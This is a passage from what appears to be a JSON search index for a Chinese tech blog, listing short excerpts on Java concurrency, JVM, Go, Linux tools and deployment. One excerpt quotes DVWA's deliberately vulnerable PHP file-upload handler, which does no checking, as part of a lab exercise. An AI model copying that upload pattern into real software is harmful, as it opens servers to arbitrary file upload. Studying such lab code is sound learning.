4 sudo apt-get install manpages-zh # 安装 中文的 man手册 alias cman=\u0026#39;man -M /usr/share/man/zh_CN\u0026#39; # 设置中文 bash基础 linux 系统中一般默认使用 bash， 文件开头需要些","lvl0":"bash基础","lvl1":null,"lvl2":"摘要","objectID":"66566760651f42b8e8e2bfced228639c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/%E5%9F%BA%E7%A1%80/"},{"content":"bean是生命周期 主要有四个，实例化Instantiation，属性赋值Populate，初始化Initialization，销毁Destr","lvl0":"bean的生命周期","lvl1":null,"lvl2":"摘要","objectID":"1b6e3eaa39f53d6f37b1596dce4e7a3f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E6%A1%86%E6%9E%B6%E4%BD%BF%E7%94%A8/bean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/"},{"content":"CompletableFuture 原理 异步化，是并行方案得以实施的基础，更深入地讲其实就是：利用多线程优化性能这个核心方案得以实施的基础。看到这里，相信你应该就能理解异步编","lvl0":"completableFuture","lvl1":null,"lvl2":"摘要","objectID":"4c75099287f1400326cb8cdb707db99c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/completablefuture/"},{"content":"completionService 的使用方法 如何批量执行异步任务？ 利用 CompletionService 可以快速实现 Forking 这种集群模式，比如下面的示例代码就展示了具体是如何实现的。首先我们创建了一个线程池 executor 、","lvl0":"completionService","lvl1":null,"lvl2":"摘要","objectID":"c0f035a0455533aaa5ddfcd24d7d458f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/completionservice/"},{"content":"如果对数据有强一致要求，则需使用 Hashtable；在大部分场景通常都是弱一致性的情况下，使用 ConcurrentHashMap 即可；如果数据量在千万级别，且存在大量增删改","lvl0":"concurrentHashMap使用场景","lvl1":null,"lvl2":"摘要","objectID":"549aa8fde6c8c317a4eb253b537654fa","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/concurrenthashmap%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF/"},{"content":"Cond并发原语学习 Java 面试中，经常被问到的一个知识点就是等待 / 通知（wait/notify）机制。面试官经常 会这样考察候选人：请实现一个限定","lvl0":"Cond 等待通知机制","lvl1":null,"lvl2":"摘要","objectID":"196dcde99fb8dcac3c9d3748598fed25","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/cond/"},{"content":"context 学习 比如，服务端接收到客户端的 HTTP 请求之后，可以把客户端的 IP 地址和端口、客户端的 身份信息、请求接收的时间、Trace ID 等信息放入到上下文中，","lvl0":"context","lvl1":null,"lvl2":"摘要","objectID":"d90086a95c6f8d0bffcf36b661092a42","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/context/"},{"content":"CopyOnWrite模式 Java 里 String 这个类在实现 replace() 方法的时候，并没有更改原字符串里面 value[] 数组的内容，而是创建了一个新字符串，这种方法在解决不可变对","lvl0":"CopyOnWrite模式","lvl1":null,"lvl2":"摘要","objectID":"599ff6f5005451136d2a8291bc3e811f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/copyonwrite/"},{"content":"open 函数 api学习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // #include\u0026lt;bits/stdc++.h\u0026gt; #include\u0026lt;sys/types.h\u0026gt;#include\u0026lt;sys/stat.h\u0026gt;#include\u0026lt;fcntl.h\u0026gt;#include\u0026lt;unistd.h\u0026gt;#include\u0026lt;stdlib.h\u0026gt; #include\u0026lt;stdio.h\u0026gt; // #include \u0026lt;iostream\u0026gt; // using namespace std; int main(void) { int fd = 0; //打开 已经存在的文件 fd","lvl0":"cpp学习和使用【文件api使用】","lvl1":null,"lvl2":"摘要","objectID":"aa6a94e534c28f91b529095d1c095f5e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/cpp%E5%AD%A6%E4%B9%A0/"},{"content":"cpu 和 内存的关系 学习视频","lvl0":"cpu程序设计","lvl1":["八股文"],"lvl2":"摘要","objectID":"36283245765588411c4d67bbc239ba71","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E9%80%9F%E6%88%90%E8%AF%BE/cpu%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"},{"content":"应用程序内存基本构成 一个应用程序的内存基本上由：栈区、堆区、数据区（静态存储区）和程序代码区组成。 栈区（Stack Sagment） 在调用函数","lvl0":"c语言基础原理","lvl1":null,"lvl2":"摘要","objectID":"fc5c0b3f998e0a04a85b3a615741e68f","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/c%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/"},{"content":"disruptor 框架介绍 ArrayBlockingQueue 和 LinkedBlockingQueue，它们都是基于 ReentrantLock 实现的，在高并发场景下，锁的效率并不高，那有没有更好的替代品呢？有，今天","lvl0":"disruptor","lvl1":null,"lvl2":"摘要","objectID":"80f670c997359d9747fffe37b186dbd9","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E6%A1%86%E6%9E%B6%E6%A1%88%E4%BE%8B/disruptor/"},{"content":"什么是dockerfile 为开发团队提供完全一致的开发环境 拿所构建的镜像通过 Dockerfile文件构建一个新的镜像开始工作 部署时，无缝移植","lvl0":"dockerfile原理","lvl1":null,"lvl2":"摘要","objectID":"ce50bf6695258da078ee4dcb0907ccad","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/dockerfile%E5%8E%9F%E7%90%86/"},{"content":"先对代码进行分析 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php if( isset( $_POST[ \u0026#39;Upload\u0026#39; ] ) ) { // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \u0026#34;hackable/uploads/\u0026#34;; $target_path .= basename( $_FILES[ \u0026#39;uploaded\u0026#39; ][ \u0026#39;name\u0026#39; ] ); // 这边没有做任何监测","lvl0":"easy难度注入靶机","lvl1":null,"lvl2":"摘要","objectID":"86faf28a9b401f2a142ea5e3bb18b5cc","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%AE%9E%E8%B7%B5/easy%E9%9A%BE%E5%BA%A6_%E4%B8%8A%E4%BC%A0%E6%B5%8B%E8%AF%95/"},{"content":"eggjs 学习总结 生成验证码 1 2 3 yarn add svg-captcha yarn add cookie-parser 添加session 支持 1 yarn add egg-session 验证码跨域问题解决 这个贼坑， cookie 讲究同源策略，要相同端口相同域名， 我的 axios 的","lvl0":"eggjs学习记录","lvl1":null,"lvl2":"摘要","objectID":"89f082d217905b4df92d100ac0d14222","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0/react%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/react%E9%A1%B9%E7%9B%AE%E8%AE%B0%E5%BD%95/koa%E6%80%BB%E7%BB%93/eggjs%E5%AD%A6%E4%B9%A0/"},{"content":"学习目标 poll函数 epoll 多路IO 模型 了解 epoll 反应堆模式设计 看懂 epoll 反应堆模型实现代码 epoll 的两种模式 水平触发： 高电平代表1 只要缓冲区有数据，就一直通知","lvl0":"epoll学习","lvl1":null,"lvl2":"摘要","objectID":"0d19753fcc2df6c5913acc0dda56484e","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/epoll-%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8/"},{"content":"frp 内网穿透命令 解压 这个 frp的压缩包到服务器 有个 frps 的文件 用来给 服务端 公网 ip 的运行 有个 frpc 的执行文件 用来给客户端运行 1 2 3 4 [common] bind_port = 7000 authentication_method = token token = yourpwd","lvl0":"frp 内网穿透命令","lvl1":null,"lvl2":"摘要","objectID":"5d309477932066773f3239623b7569fe","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"},{"content":"部署的骚操作 [TOC] 总结两大块 ftp使用方法 scp使用方法 ftp 使用总结 ftp 使用教程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 ftp ip # 通过 ftp 连接远程","lvl0":"ftp命令以及原理","lvl1":null,"lvl2":"摘要","objectID":"7e445f51762b23381a5a96b2df7e16a4","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/%E9%83%A8%E7%BD%B2%E6%80%BB%E7%BB%93/ftp%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"},{"content":"git 有3个状态 工作区 -\u0026gt; 暂存区 -\u0026gt; 版本库 练习 git 网站 有一个head 指针指向 当前暂存区的节点， 如果我提交新代码到暂存区 就新增加一个节点，内容复制到新节","lvl0":"git学习","lvl1":null,"lvl2":"摘要","objectID":"41832f4cb98e8a4c2a58fcd1f589a1f5","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/shell%E5%91%BD%E4%BB%A4%E5%AD%A6%E4%B9%A0/git%E5%AD%A6%E4%B9%A0/"},{"content":"三色标记法原理 垃圾回收(Garbage Collection，简称GC)是编程语言中提供的自动的内存管理机制，自动释放不需要的对象，让出存储器","lvl0":"golang 垃圾回收机制","lvl1":null,"lvl2":"摘要","objectID":"60063152496291af06b452b72ace86ab","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/golang%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/golang%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"},{"content":"golang 爬虫框架使用","lvl0":"golang爬虫demo","lvl1":null,"lvl2":"摘要","objectID":"b1c2f1fb1bc7970551e9529af6fdc800","tags":["个人总结"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/golang/golang-%E7%88%AC%E8%99%AB/"},{"content":"参考的文档教程 基础知识和结论 Java使用的是一对一线程模型，所以它的一个线程对应于一个内核线程，调度完全交给操作系统来处理； Go语言使用的是","lvl0":"go语言并发模型","lvl1":null,"lvl2":"摘要","objectID":"c968ec16f9a87ac7254bbb7775995aa8","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E6%A8%A1%E5%9E%8B/"},{"content":"等待唤醒 比如 我 生产者生成的内容满了， 就等待 wait， 消费者没东西消费了 ，就 调用 notifyAll 叫醒 生产者，同时自己调用 wait 睡眠 那我们来看看现实世界里是如何解","lvl0":"Guarded Suspension 等待唤醒机制的规范实现","lvl1":null,"lvl2":"摘要","objectID":"2698b25696c58c4b840871fc5034ce5f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/guarded-suspension/"},{"content":"happen-befores原则 使用 happens-before 在一个 goroutine 内部，程序的执行顺序和它们的代码指定的顺序是一样的，即使编译器 或者 CPU 重排了读写顺序，从行为上来","lvl0":"happen-befores原则","lvl1":null,"lvl2":"摘要","objectID":"e0f12bf4ab18eceb02d068d19c003159","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/go%E8%AF%AD%E8%A8%80%E5%B9%B6%E5%8F%91%E7%90%86%E8%AE%BA/happen-befores%E5%8E%9F%E5%88%99/"},{"content":"hikaricp原理 参考官网文档 HiKariCP 官方网站解释了其性能之所以如此之高的秘密。微观上 HiKariCP 程序编译出的字节码执行效率更高，站在字节码的角度去优化 Java","lvl0":"hikaricp","lvl1":null,"lvl2":"摘要","objectID":"605ff3074ae09a27220543624c1063a9","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E6%A1%86%E6%9E%B6%E6%A1%88%E4%BE%8B/hikaricp/"},{"content":"hugo github actions 部署配置 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 name:GitHubPageson:push:branches:- master # Set a branch to deployjobs:deploy:runs-on:ubuntu-18.04steps:- uses:actions/checkout@v2with:submodules:recursive # Fetch Hugo themes (true OR recursive)fetch-depth:0# Fetch all history for .GitInfo and .Lastmod- name:Setup Hugouses:peaceiris/actions-hugo@v2with:# hugo-version: \u0026#39;${{ steps.hugo-version.outputs.HUGO_VERSION }}\u0026#39;hugo-version:\u0026#39;0.74.2\u0026#39;# extended:","lvl0":"hugo github actions部署","lvl1":null,"lvl2":"摘要","objectID":"c7c1f379aafee0f6de094ac474f06eb8","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/hugo/hugo-github-actions/"},{"content":"Immutability模式：如何利用不变性解决并发问题？ “多个线程同时读写同一共享变量存在并发问题”，这里的必要条件之一是读写，如果只有读","lvl0":"Immutability模式","lvl1":null,"lvl2":"摘要","objectID":"a063dabe61d886db475107841332d71b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/immutability%E6%A8%A1%E5%BC%8F/"},{"content":"linux 文件系统相关 像一家公司要做 To B 的生意，发现客户多种多样，众口难调，不同的地域不一样，不同的行业不一样。如果你不懂某个地方的规矩，根本卖不出","lvl0":"IO方面的知识","lvl1":null,"lvl2":"摘要","objectID":"330b754c039be81d5840a47b6cfffddc","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/io%E6%96%B9%E9%9D%A2%E7%9A%84%E7%9F%A5%E8%AF%86/"},{"content":"springmvc怎么处理json数据 ajax请求 通过 HandlerAdapter 处理 这个 数据，","lvl0":"java spring全家桶","lvl1":null,"lvl2":"摘要","objectID":"982a1978441138e6620ea2c8ed43d014","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java-spring%E5%85%A8%E5%AE%B6%E6%A1%B6/"},{"content":"java 调优工具","lvl0":"JAVA 调优工具","lvl1":null,"lvl2":"摘要","objectID":"a578e0fa413c46134e6d9d86651afbb8","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/java-%E8%B0%83%E4%BC%98%E5%B7%A5%E5%85%B7/"},{"content":"**在并发编程中，多个线程访问同一个共享资源时，我们必须考虑如何维护数据的原子性。**在 JDK1.5 之前，Java 是依靠 Synchronized 关键字实现锁功能来做到这点的","lvl0":"java_多线程_锁优化","lvl1":null,"lvl2":"摘要","objectID":"1fee4302c9f6c99a698183091bd81d69","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/java_%E5%A4%9A%E7%BA%BF%E7%A8%8B_%E9%94%81%E4%BC%98%E5%8C%96/"},{"content":"arraylist换成线程安全的copyOnwriteList就可以解决线程不安全问题? copyOnwriteList更适合某一时间段统一新","lvl0":"java_优化_容器优化","lvl1":null,"lvl2":"摘要","objectID":"efc9b7850e560d0c3c376f00e3f6deaa","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/java_%E4%BC%98%E5%8C%96_%E5%AE%B9%E5%99%A8%E4%BC%98%E5%8C%96/"},{"content":"有什么优化的手段呢？ 字符串拼接用 StringBuilder stringBuffer intern 优化常用字符串 这个案例来自一位 Twitter 工程师在 QCon 全球软件开发大会上的演讲，他们想到的解决方法，就是使用 String.intern 来节","lvl0":"java_优化_字符串优化的方法","lvl1":null,"lvl2":"摘要","objectID":"5520d50a1bf13fd0dedc374e3f96ac5a","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/java_%E4%BC%98%E5%8C%96_%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BC%98%E5%8C%96%E7%9A%84%E6%96%B9%E6%B3%95/"},{"content":"java 八股 垃圾回收 SurvivorRatio 2个survivor 区 和 Eden区的比值，默认值为8，即$ Eden区: From区域:TO 区域 = 8:1:1 $","lvl0":"java八股_垃圾回收","lvl1":null,"lvl2":"摘要","objectID":"c5b73e1721a410b59f69ccc457786a30","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/java/java%E5%85%AB%E8%82%A1%E9%A2%98_%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"},{"content":"java 并发八股文 面试题网站 线程生命周期 当线程被创建并启动以后，它既不是一启动就进入了执行状态，也不是一直处于执行状态。在线程的生命周期中，它要经","lvl0":"java并发八股","lvl1":null,"lvl2":"摘要","objectID":"8b61d0f9db4f2524e1c9c151c1f9eb1f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/java%E5%B9%B6%E5%8F%91%E5%85%AB%E8%82%A1/"},{"content":"如何防止死锁 tryLock 按经历只获取一个资源，不要同时获取多个资源 尽量按顺序上锁 总结： tryLock 方法 lock方法 lock是无条件阻塞加锁，tryLock 的话是","lvl0":"java并发八股[reentrantLock,查看线程死锁]","lvl1":null,"lvl2":"摘要","objectID":"7c0bef2ae5c284ea24822336db005e20","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/reentrantlock/"},{"content":"并发编程需要解决的问题 从性能角度讲，我们为了提高执行一定计算机任务的效率，所以IO等待的时候不能让cpu闲着，所以我们把任务拆分交替执行，有","lvl0":"java并发编程基础学习","lvl1":null,"lvl2":"摘要","objectID":"cbc6b8c18e282cb03ed43510edcc6991","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"content":"java 多线程避免死锁 面向对象思想里面有一个很重要的特性是封装，封装的通俗解释就是将属性和实现细节封装在对象内部，外界对象只能通过目标对象提供的公","lvl0":"java多线程避免死锁","lvl1":null,"lvl2":"摘要","objectID":"06cca918930d286fc872b19556fb1108","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/java-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%81%BF%E5%85%8D%E6%AD%BB%E9%94%81%E6%93%8D%E4%BD%9C/"},{"content":"其实在单个处理器的时期，操作系统就能处理多线程并发任务。处理器给每个线程分配 CPU 时间片（Time Slice），线程在分配获得的时间片内执行任务","lvl0":"java多线程上下文切换","lvl1":null,"lvl2":"摘要","objectID":"4bd7873039694a04bbf96216d1bf7197","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/java_%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%8A%E4%B8%8B%E6%96%87%E5%88%87%E6%8D%A2%E6%80%A7%E8%83%BD%E9%97%AE%E9%A2%98/"},{"content":"为什么学习字节码文件 类的结构有几个部分 字节码都有哪些？ java class文件由上面组成 局部变量表 class文件版本号 魔数 【确定当前文件是一个能被虚","lvl0":"java前端编译器","lvl1":null,"lvl2":"摘要","objectID":"4153a772bb252ab575c5e92fda47a451","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E5%85%AB%E8%82%A1%E6%B7%B1%E6%8C%96/java-%E5%89%8D%E7%AB%AF%E7%BC%96%E8%AF%91%E5%99%A8/"},{"content":"JMM JMM是什么 JMM是一种规范，目的是解决由于多线程通过共享内存进行通信时，存在的本地内存数据不一致、编译器会对代码指令重排序、处理器会对代","lvl0":"JMM","lvl1":null,"lvl2":"摘要","objectID":"97031390cd69f724a9481c69acbebb36","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/jmm/"},{"content":"在 Java 语言中，Sun 公司的工程师们对 String 对象做了大量的优化，来节约内存空间，提升 String 对象在系统中的性能。一起来看看优化过程，如下图所示： 工程师将 char[]","lvl0":"jvm编程理论","lvl1":null,"lvl2":"摘要","objectID":"9aef31a7faad2b50afd52ddcb7e77efa","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm%E7%BC%96%E7%A8%8B%E7%90%86%E8%AE%BA/"},{"content":"JMM JMM是什么 JMM是一种规范，目的是解决由于多线程通过共享内存进行通信时，存在的本地内存数据不一致、编译器会对代码指令重排序、处理器会对代","lvl0":"JVM全集","lvl1":null,"lvl2":"摘要","objectID":"d12e27835b79ece9208f18e4316bd058","tags":["JVM"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm%E8%AF%A6%E7%BB%86%E5%8E%9F%E7%90%86%E6%9D%A5%E8%87%AA%E7%BD%91%E5%8F%8B%E6%95%B4%E7%90%86/jvm%E5%85%A8%E9%9B%86/"},{"content":"什么是 JNI java native interface，api 底层实现是 c 和 c++ java GC root 有哪些 Class Thread ，活着的线程 Stack Local , java 方法的Local变量参数 JNI local Jni Global monitor Used , 用于同步的监","lvl0":"jvm什么时候进行垃圾回收","lvl1":null,"lvl2":"摘要","objectID":"9922b2b285e0eb9eff6190a6b4bd3d6c","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/jvm%E7%90%86%E8%AE%BA/jvm-%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/"},{"content":"免责声明： 切勿使用教程中的内容进行违法活动，后果自负 开源，免费，可以给任何人使用 广泛支持无线协议 在安全环境中开发 GPG 签名包和存储库 kali 可以用于各","lvl0":"kali的优势","lvl1":null,"lvl2":"摘要","objectID":"7879b9389345120987cfc791e5426f34","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/kali-linux%E5%AD%A6%E4%B9%A0/kali%E5%9F%BA%E7%A1%80/kali%E7%9A%84%E4%BC%98%E5%8A%BF/"},{"content":"1. Linux文件管理 Linux中的所有数据都被保存在文件中，所有的文件被分配到不同的目录。目录是一种类似于树的结构，称为文件系统。 1.1. 文件类型","lvl0":"linux file 